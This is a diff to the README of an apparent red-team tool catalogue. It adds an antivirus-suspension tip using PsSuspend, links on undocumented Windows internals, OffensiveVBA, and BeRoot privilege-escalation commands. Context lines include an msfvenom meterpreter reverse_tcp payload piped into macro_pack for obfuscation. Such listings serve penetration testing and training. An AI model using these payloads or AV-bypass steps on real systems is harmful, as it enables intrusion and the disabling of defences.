@@ -23,7 +23,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 # Tool List
 
 <details open>
-    <summary><b>Red Team Tips</b> 16 tips</summary>
+    <summary><b>Red Team Tips</b> 17 tips</summary>
     <ul>
         <ul>
             <li><b><a href="#hiding-the-local-admin-account">Hiding the local admin account</a></b><i> @Alh4zr3d</i></li>
@@ -42,6 +42,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#cmd-shortcut-with-6-pixels-via-mspaint">CMD shortcut with 6 pixels via mspaint</a></b><i> PenTestPartners</i></li>
             <li><b><a href="#link-spoofing-with-preventdefault-javascript-method">Link spoofing with PreventDefault JavaScript method</a></b><i> </i></li>
             <li><b><a href="#check-smb-firewall-rules-with-responder">Check SMB firewall rules with Responder</a></b><i> @malmoeb</i></li>
+            <li><b><a href="#disable-av-with-sysinternals-pssuspend">Disable AV with SysInternals PsSuspend</a></b><i> @0gtweet</i></li>
         </ul>
     </ul>        
 </details>
@@ -75,7 +76,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Resource Development</b> 8 tools</summary>
+    <summary><b>Resource Development</b> 11 tools</summary>
     <ul>
         <ul>
             <li><b><a href="#chimera">Chimera</a></b><i> PowerShell obfuscation</i></li>
@@ -83,6 +84,9 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#shellter">Shellter</a></b><i> Dynamic shellcode injection tool</i></li>
             <li><b><a href="#freeze">Freeze</a></b><i> Payload creation (circumventing EDR)</i></li>
             <li><b><a href="#wordsteal">WordSteal</a></b><i> Steal NTML hashes with Microsoft Word</i></li>
+            <li><b><a href="#ntapi-undocumented-functions">NTAPI Undocumented Functions</a></b><i> Windows NT Kernel, Native API and drivers</i></li>
+            <li><b><a href="#kernel-callback-functions">Kernel Callback Functions</a></b><i> Undocumented Windows APIs</i></li>
+            <li><b><a href="#offensivevba">OffensiveVBA</a></b><i> Office macro code execution and evasion techniques</i></li>
             <li><b><a href="#wsh">WSH</a></b><i> Wsh payload</i></li>
             <li><b><a href="#hta">HTA</a></b><i> Hta  payload</i></li>
             <li><b><a href="#vba">VBA</a></b><i> Vba  payload</i></li>
@@ -138,7 +142,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Privilege Escalation</b> 9 tools</summary>
+    <summary><b>Privilege Escalation</b> 10 tools</summary>
     <ul>
         <ul>
             <li><b><a href="#linpeas">LinPEAS</a></b><i> Linux privilege escalation</i></li>
@@ -149,7 +153,8 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#sherlock">Sherlock</a></b><i> PowerShell privilege escalation tool</i></li>
             <li><b><a href="#watson">Watson</a></b><i> Windows privilege escalation tool</i></li>
             <li><b><a href="#impulsivedllhijack">ImpulsiveDLLHijack</a></b><i> DLL Hijack tool</i></li>
-            <li><b><a href="#adfsdump">ADFSDump</a></b><i> AD FS dump tool</i></li>
+            <li><b><a href="#adfsdump">ADFSDump</a></b><i> AD FS dump tool</i></li> 
+            <li><b><a href="#beroot">BeRoot</a></b><i> Multi OS Privilege Escalation Project</i></li>
         </ul>
     </ul>
 </details>
@@ -501,6 +506,16 @@ Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
 **Credit:** [@malmoeb](https://twitter.com/malmoeb)
 
 **Link:** [Twitter](https://twitter.com/malmoeb/status/1628272928855826433)
+
+### [🔙](#tool-list)Disable AV with SysInternals PsSuspend
+
+![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4519f5ad-c177-4550-b9af-238fa73ad66e)
+
+**Description:** *Using the Microsoft Sysinternals tool PsSuspend.exe it's possible to suspend some AV service executables. The Microsoft signed tool can be passed the PID or Name of a running service, it will suspend the process via the NtSuspendProcess Windows API.*
+
+**Related Blog Post:** [Bypassing AV via Process Suspension with PsSuspend.exe](https://apoc.work/2023/03/22/av-bypass-with-process-suspension)
+
+**Link:** [Twitter](https://twitter.com/0gtweet/status/1638069413717975046)
 
 Reconnaissance
 ====================
@@ -1225,6 +1240,50 @@ cd WordSteal
 
 *Image used from https://pentestit.com/wordsteal-steal-ntlm-hashes-remotely/*
 
+### [🔙](#tool-list)[NTAPI Undocumented Functions](http://undocumented.ntinternals.net/)
+
+This site provides information on undocumented Windows internals, system calls, data structures, and other low-level details of the Windows operating system. 
+
+It can be a valuable resource for individuals who want to explore the internals of Windows for various purposes, including vulnerability analysis, exploit development, and privilege escalation.
+
+When developing exploits, understanding the internals of the target system is crucial. This site can help develop exploits by leveraging the low-level undocumented aspects of Windows.
+
+**Usage:** 
+
+Visit [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/)
+
+![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/41b424f3-053c-440b-b0fd-235e95980d9a)
+
+*Image used from http://undocumented.ntinternals.net/*
+
+### [🔙](#tool-list)[Kernel Callback Functions](https://codemachine.com/articles/kernel_callback_functions.html)
+
+This technical note provides a comprehensive list all the APIs exported by the Windows Kernel, for driver writes to register callback routines that are invoked by kernel components under various circumstances. 
+
+Most of these routines are documented in the Windows Driver Kit (WDK) but some of them are for use by in-box drivers. 
+
+The undocumented functions are described briefly whereas the documented ones are just listed here for reference.
+
+**Usage:** 
+
+Visit [https://codemachine.com/articles/kernel_callback_functions.html](https://codemachine.com/articles/kernel_callback_functions.html)
+
+![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/b7532b7d-1abc-4af6-be92-f6f78d24a788)
+
+*Image used from https://codemachine.com*
+
+### [🔙](#tool-list)[OffensiveVBA](https://github.com/S3cur3Th1sSh1t/OffensiveVBA)
+
+A collection of offensive techniques, scripts and useful links for achieving code execution and defense evasion via office macros.
+
+**Usage:** 
+
+Visit [https://github.com/S3cur3Th1sSh1t/OffensiveVBA#templates-in-this-repo](https://github.com/S3cur3Th1sSh1t/OffensiveVBA#templates-in-this-repo)
+
+![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/7f7ad942-48d7-42e7-a3cc-55ec84139058)
+
+*Image used from https://github.com/S3cur3Th1sSh1t*
+
 ### [🔙](#tool-list)WSH
 
 **Creating payload:** 
@@ -1622,7 +1681,6 @@ python3 macro_pack.py  --help
 
 # List all supported file formats
 macro_pack.exe --listformats
-
 # Obfuscate the vba file generated by msfvenom and puts result in a new VBA file.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba
 
@@ -2350,6 +2408,44 @@ ADFSDump was built against .NET 4.5 with Visual Studio 2017 Community Edition. S
 
 *Image used from https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs*
 
+### [🔙](#tool-list)[BeRoot](https://github.com/AlessandroZ/BeRoot)
+
+BeRoot Project is a post exploitation tool to check common misconfigurations to find a way to escalate our privilege.
+
+The goal of BeRoot is to only output potential privilege escalation opportunities and not a endpoint configuration assessment.
+
+This project works on Windows, Linux and Mac OS.
+
+**Install: (Linux)** 
+
+```bash
+git clone https://github.com/AlessandroZ/BeRoot
+cd BeRoot/Linux/
+```
+
+**Install: (Windows)** 
+
+A pre-compiled version of BeRoot can be found [here](https://github.com/AlessandroZ/BeRoot/releases).
+
+**Usage:** 
+
+```bash
+# Run BeRoot
+python beroot.py
+
+# Run BeRoot with user password (If you know the password use it, you could get more results)
+python beroot.py --password super_strong_password
+```
+
+Further information can be found here for:
+
+- [Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)
+- [Windows](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
+
+![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4c84ffeb-1ffb-474a-b028-4c8fcc64deb6)
+
+*Image used from https://github.com/AlessandroZ/BeRoot*
+
 Defense Evasion
 ====================
 
@@ -2949,7 +3045,7 @@ Open up the project .sln, choose "release", and build.
 
 *Image used from https://github.com/djhohnstein/SharpChromium*
 
-### [🔙](#tool-list)[dploot]([dploot](https://github.com/zblurx/dploot))
+### [🔙](#tool-list)[dploot](https://github.com/zblurx/dploot)
 
 DPAPI (Data Protection Application Programming Interface) provides a set of APIs to encrypt and decrypt data where a user password is typically used to set the 'master key' (in a user scenario). So to leverage DPAPI to gain access to certain data (Chrome Cookies/Login Data, the Windows Credential Manager/Vault etc) we just need access to a password.
 
